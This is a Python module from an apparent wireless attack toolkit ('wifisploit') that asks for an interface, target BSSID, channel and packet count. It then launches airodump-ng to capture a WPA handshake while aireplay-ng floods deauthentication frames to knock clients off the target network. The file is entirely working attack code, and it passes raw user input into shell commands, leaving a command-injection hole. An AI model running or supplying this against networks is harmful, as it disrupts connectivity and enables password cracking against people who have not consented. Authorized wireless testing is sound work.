# wifisploit/modules/capture_handshake.py

import os

a = '\033[0;31m'
b = '\033[0;32m'
c = '\033[0;37m'
d = '\033[1;37m'

interface = input(f'{d}wsf ({a}Interface{d})> {c}')
if interface.lower() == 'back':
	quit()
else:
	print(f'{d}Interface => {b}{interface}')

bssid = input(f'{d}wsf ({a}BSSID{d})> {c}')
if bssid.lower() == 'back':
	quit()
else:
	print(f'{d}BSSID => {b}{bssid}')

channel = int(input(f'{d}wsf ({a}Channel{d})> {c}'))
if channel == 'back':
	quit()
else:
	print(f'{d}Channel => {b}{channel}')

packet = int(input(f'{d}wsf ({a}Packets{d})> {c}'))
if packet == 'back':
	quit()
else:
	print(f'{d}Packets => {b}{packet}')

path = input(f'{d}wsf ({a}Path{d})> {c}')
if path.lower() == 'back':
	quit()
else:
	print(f'{d}Path => {b}{path}')
os.system(f'iwconfig {interface} channel {channel}')
os.system(f'xterm -geometry 120x35 -e airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | xterm -geometry 120x35 -e aireplay-ng --deauth {packet} -a {bssid} {interface}')
